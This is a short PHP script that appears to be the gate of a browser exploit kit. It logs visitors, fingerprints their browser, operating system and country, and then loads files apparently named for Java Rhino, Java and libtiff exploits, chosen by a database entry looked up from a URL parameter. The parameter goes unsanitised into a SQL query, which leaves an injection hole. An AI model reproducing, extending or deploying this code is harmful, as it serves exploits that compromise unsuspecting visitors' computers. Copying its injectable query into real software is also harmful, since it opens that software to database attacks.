<?php
include "config.php";
include "func.php";

$user_agent = $_SERVER["HTTP_USER_AGENT"];
$ip  = ip();

uniq();
detect_browser();
detect_os();
detect_country();
addlog();

$sellcode = $_GET['showtopic'];
$qwe = mysql_query("select exploits from threads WHERE link='".$sellcode."'");
$selle = mysql_fetch_array($qwe);
$e = explode(":", $selle['exploits']);
 $rhino = false;
 $obe = false;
 $lib = false;

for ($i = 0; $i < count($e); $i++)
	{
		if($e[$i] == 'rhino')$rhino = true;
		if($e[$i] == 'obe') $obe = true;
		if($e[$i] == 'lib') $lib = true;	
	}


	if($rhino)include("rhi.php");
	if($obe) include("jbe.php");
	if($lib) include("libtiff.php");
//==========================================